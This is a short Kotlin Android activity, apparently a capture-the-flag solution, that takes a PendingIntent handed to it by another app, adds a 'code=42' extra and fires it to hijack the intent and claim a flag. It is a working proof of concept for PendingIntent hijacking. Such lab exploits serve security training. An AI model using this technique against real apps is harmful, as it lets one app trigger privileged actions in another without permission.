package com.example.myapplication

import android.app.Activity
import android.app.PendingIntent
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast

class Flag23HijackActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val pendingIntent = intent.getParcelableExtra<PendingIntent>("pending_intent")
        Log.i("Flag23Hijack", "Got pending intent: $pendingIntent")

        if (pendingIntent != null) {
            val fillInIntent = Intent().apply {
                putExtra("code", 42)
            }
            try {
                pendingIntent.send(this, 0, fillInIntent)
                Toast.makeText(this, "Sent hijacked intent with code=42", Toast.LENGTH_LONG).show()
            } catch (e: PendingIntent.CanceledException) {
                e.printStackTrace()
            }
        } else {
            Toast.makeText(this, "No pending_intent extra found", Toast.LENGTH_LONG).show()
        }

        finish()
    }
}